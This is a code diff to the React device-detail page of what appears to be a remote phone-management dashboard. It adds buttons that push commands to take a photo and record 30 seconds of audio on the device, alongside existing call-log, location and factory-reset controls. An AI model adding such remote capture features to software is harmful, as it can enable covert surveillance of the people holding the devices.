@@ -7,7 +7,7 @@ import {
   ArrowLeft, Battery, Wifi, MapPin, RefreshCw,
   Bell, Terminal, Info, Package, Users, Phone, PhoneIncoming,
   PhoneOutgoing, PhoneMissed, Mail, Smartphone, Activity, Navigation,
-  Search, X
+  Search, X, Camera, Mic
 } from 'lucide-react'
 import { formatDistanceToNow, format } from 'date-fns'
 import toast from 'react-hot-toast'
@@ -230,7 +230,7 @@ export default function DeviceDetailPage() {
   })
 
   const pushMutation = useMutation({
-    mutationFn: () => api.post(`/devices/${id}/push`, { messageType: pushType }),
+    mutationFn: (body: object) => api.post(`/devices/${id}/push`, body),
     onSuccess: () => toast.success('Push queued'),
     onError: () => toast.error('Push failed'),
   })
@@ -364,12 +364,43 @@ export default function DeviceDetailPage() {
               <option value="reboot">Reboot</option>
               <option value="lock">Lock Device</option>
               <option value="factoryReset">Factory Reset</option>
-            </select>
-            <button onClick={() => pushMutation.mutate()} disabled={pushMutation.isPending} className="btn-primary text-sm">
+            </select>          <button onClick={() => pushMutation.mutate({ messageType: pushType })} disabled={pushMutation.isPending} className="btn-primary text-sm">
               <Bell className="w-4 h-4" /> Send
             </button>
-          </div>
         </div>
+      </div>
+
+      {/* ── Media Controls (Camera / Audio Capture) ── */}
+      <div className="card p-5 grid sm:grid-cols-2 gap-4">
+        <div>
+          <label className="label flex items-center gap-1.5">
+            <Camera className="w-4 h-4" /> Remote Camera Capture
+          </label>
+          <p className="text-xs text-gray-400 mb-2">Sends a push command to capture a photo on the device.</p>
+          <button
+            onClick={() => pushMutation.mutate({ messageType: 'captureCamera' })}
+            disabled={pushMutation.isPending}
+            className="btn-primary text-sm w-full flex items-center justify-center gap-2"
+          >
+            <Camera className="w-4 h-4" />
+            Capture Camera
+          </button>
+        </div>
+        <div>
+          <label className="label flex items-center gap-1.5">
+            <Mic className="w-4 h-4" /> Remote Audio Recording
+          </label>
+          <p className="text-xs text-gray-400 mb-2">Sends a push command to record 30s audio on the device.</p>
+          <button
+            onClick={() => pushMutation.mutate({ messageType: 'recordAudio' })}
+            disabled={pushMutation.isPending}
+            className="btn-primary text-sm w-full flex items-center justify-center gap-2"
+          >
+            <Mic className="w-4 h-4" />
+            Record Audio (30s)
+          </button>
+        </div>
+      </div>
       </div>
 
       {/* ── Tabs ── */}
